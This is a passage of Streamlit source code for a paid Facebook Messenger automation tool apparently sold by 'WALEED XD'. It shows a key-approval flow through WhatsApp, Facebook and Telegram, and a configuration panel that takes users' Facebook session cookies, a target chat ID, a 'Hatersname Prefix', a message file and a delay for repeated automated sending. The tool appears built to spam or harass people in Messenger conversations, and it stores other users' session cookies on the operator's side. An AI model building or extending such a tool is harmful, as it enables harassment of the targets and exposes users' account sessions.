            <div style="font-size: 1.2rem; font-weight: bold; letter-spacing: 2px; background: rgba(0,0,0,0.3); padding: 1rem; border-radius: 5px; margin: 1rem 0; border: 1px solid #f59e0b;">
                {st.session_state.approval_key}
            </div>
            <button style="background: #f59e0b; color: white; border: none; border-radius: 8px; padding: 10px 20px; cursor: pointer;" onclick="navigator.clipboard.writeText('{st.session_state.approval_key}')">📋 Copy Key</button>
        </div>
        """, unsafe_allow_html=True)
        
        st.markdown("### 📝 Enter Your Real Name")
        user_real_name = st.text_input("Your Real Name", key="real_name", placeholder="Enter your real name for approval", 
                                      value=st.session_state.user_real_name)
        
        if user_real_name:
            st.session_state.user_real_name = user_real_name
            db.update_user_real_name(st.session_state.user_id, user_real_name)
        
        # Send Approval Request Button
        st.markdown("### 📤 Send Approval Request")
        
        if st.button("📨 Send Approval Request", use_container_width=True, key="send_approval_btn"):
            if st.session_state.user_real_name:
                st.success("Approval request ready! Use the contact buttons below to send it.")
            else:
                st.warning("Please enter your real name first")
        
        # Contact buttons
        st.markdown("### 📞 Contact Waleed Khan for Approval")
        
        col1, col2, col3 = st.columns(3)
        
        with col1:
            whatsapp_url = send_approval_request_via_whatsapp(
                st.session_state.user_real_name if st.session_state.user_real_name else "Not Provided", 
                st.session_state.approval_key
            )
            st.markdown(f'<a href="{whatsapp_url}" style="display: block; text-align: center; background: linear-gradient(135deg, #25D366, #128C7E); color: white; padding: 15px; border-radius: 12px; text-decoration: none; font-weight: 600; margin: 10px 0;" target="_blank">📱 WhatsApp</a>', unsafe_allow_html=True)
        
        with col2:
            facebook_url = send_approval_request_via_facebook(
                st.session_state.user_real_name if st.session_state.user_real_name else "Not Provided", 
                st.session_state.approval_key
            )
            st.markdown(f'<a href="{facebook_url}" style="display: block; text-align: center; background: linear-gradient(135deg, #1877F2, #0D5CB6); color: white; padding: 15px; border-radius: 12px; text-decoration: none; font-weight: 600; margin: 10px 0;" target="_blank">👤 Facebook</a>', unsafe_allow_html=True)
        
        with col3:
            telegram_url = send_approval_request_via_telegram(
                st.session_state.user_real_name if st.session_state.user_real_name else "Not Provided", 
                st.session_state.approval_key
            )
            st.markdown(f'<a href="{telegram_url}" style="display: block; text-align: center; background: linear-gradient(135deg, #0088cc, #006699); color: white; padding: 15px; border-radius: 12px; text-decoration: none; font-weight: 600; margin: 10px 0;" target="_blank">✈️ Telegram</a>', unsafe_allow_html=True)
        
        st.info("After sending the approval request, wait for Waleed to approve your key. Refresh this page to check your approval status.")
        
        # Check approval status
        if st.button("🔄 Check Approval Status", use_container_width=True):
            current_status = db.get_approval_status(st.session_state.user_id)
            st.session_state.approval_status = current_status
            
            if current_status == 'approved':
                st.success("🎉 Your account has been approved! You can now access the automation features.")
                st.rerun()
            else:
                st.warning("Your approval is still pending. Please wait for Waleed to approve your request.")
        
        if st.sidebar.button("🚪 Logout"):
            st.session_state.logged_in = False
            st.session_state.user_id = None
            st.session_state.username = None
            st.session_state.approval_status = 'pending'
            st.session_state.approval_key = None
            st.session_state.user_real_name = ""
            st.rerun()
    
    else:
        # User is approved and can access automation
        if not st.session_state.auto_start_checked and st.session_state.user_id:
            st.session_state.auto_start_checked = True
            should_auto_start = db.get_automation_running(st.session_state.user_id)
            if should_auto_start and not st.session_state.automation_state.running:
                user_config = db.get_user_config(st.session_state.user_id)
                if user_config and user_config['chat_id']:
                    start_automation(user_config, st.session_state.user_id)
        
        st.sidebar.markdown(f"### 👤 {st.session_state.username}")
        st.sidebar.markdown(f"**Status:** <span class='status-badge status-approved'>✅ Approved</span>", unsafe_allow_html=True)
        st.sidebar.markdown(f"**User ID:** {st.session_state.user_id}")
        
        # USER PANEL LOGOUT BUTTON
        if st.sidebar.button("🚪 Logout", use_container_width=True):
            if st.session_state.automation_state.running:
                stop_automation(st.session_state.user_id)
            
            st.session_state.logged_in = False
            st.session_state.user_id = None
            st.session_state.username = None
            st.session_state.approval_status = 'pending'
            st.session_state.approval_key = None
            st.session_state.user_real_name = ""
            st.session_state.automation_running = False
            st.session_state.auto_start_checked = False
            st.rerun()
        
        user_config = db.get_user_config(st.session_state.user_id)
        
        if user_config:
            tab1, tab2 = st.tabs(["⚙️ Configuration", "🚀 Automation"])
            
            with tab1:
                st.markdown('<div class="premium-card">', unsafe_allow_html=True)
                st.markdown("### Your Configuration")
                
                chat_id = st.text_input("Chat/Conversation ID", value=user_config['chat_id'], 
                                       placeholder="e.g., 1362400298935018 (Facebook conversation ID from URL)")
                
                name_prefix = st.text_input("Hatersname Prefix", value=user_config['name_prefix'],
                                           placeholder="e.g., [END TO END WALEED HERE]")
                
                delay = st.number_input("Delay (seconds)", min_value=1, max_value=300, 
                                       value=user_config['delay'])
                
                cookies = st.text_area("Facebook Cookies (optional)", 
                                      value="",
                                      placeholder="Paste your Facebook cookies here (encrypted and private)",
                                      height=100)
                
                uploaded_file = st.file_uploader("Messages File Upload", type=['txt'])
                
                if uploaded_file is not None:
                    messages_content = uploaded_file.getvalue().decode("utf-8")
                else:
                    messages_content = user_config.get('messages_file_content', '')
                
                if st.button("💾 Save Configuration", use_container_width=True):
                    final_cookies = cookies if cookies.strip() else user_config['cookies']
                    db.update_user_config(
                        st.session_state.user_id,
                        chat_id,
                        name_prefix,
                        delay,
                        final_cookies,
                        messages_content
                    )
                    st.success("Configuration saved successfully!")
                    st.rerun()
                st.markdown('</div>', unsafe_allow_html=True)
            
            with tab2:
                st.markdown('<div class="premium-card">', unsafe_allow_html=True)
                st.markdown("### Automation Control")
                
                col1, col2, col3 = st.columns(3)
                
                with col1:
                    st.metric("Messages Sent", st.session_state.automation_state.message_count)
                
                with col2:
                    status = "🟢 Running" if st.session_state.automation_state.running else "🔴 Stopped"
                    st.metric("Status", status)
                
                with col3:
                    st.metric("Total Logs", len(st.session_state.automation_state.logs))
                
                col1, col2 = st.columns(2)
                
                with col1:
                    if st.button("▶️ Start E2EE", disabled=st.session_state.automation_state.running, use_container_width=True):
                        current_config = db.get_user_config(st.session_state.user_id)
                        if current_config and current_config['chat_id']:
                            start_automation(current_config, st.session_state.user_id)
                            st.rerun()
                        else:
                            st.error("Please configure Chat ID first!")
                
                with col2:
                    if st.button("⏹️ Stop E2EE", disabled=not st.session_state.automation_state.running, use_container_width=True):
                        stop_automation(st.session_state.user_id)
                        st.rerun()
                
                st.markdown("### 📜 Live Logs")
                
                if st.session_state.automation_state.logs:
                    logs_html = '<div class="log-container">'
                    for log in st.session_state.automation_state.logs[-50:]:
                        logs_html += f'<div>{log}</div>'
                    logs_html += '</div>'
                    st.markdown(logs_html, unsafe_allow_html=True)
                else:
                    st.info("No logs yet. Start automation to see logs here.")
                
                if st.session_state.automation_state.running:
                    time.sleep(1)
                    st.rerun()
                st.markdown('</div>', unsafe_allow_html=True)

st.markdown('</div>', unsafe_allow_html=True)  # Close premium-card

# Premium Footer
st.markdown("""
<div class="premium-footer">
    <div style="color: white; font-size: 1.1rem; font-weight: bold; margin-bottom: 10px;">WALEED XD E2E PAID TOOL</div>
    <p>Made with ❤️ by WALEED XD © 2025 All Rights Reserved</p>
</div>
""", unsafe_allow_html=True)
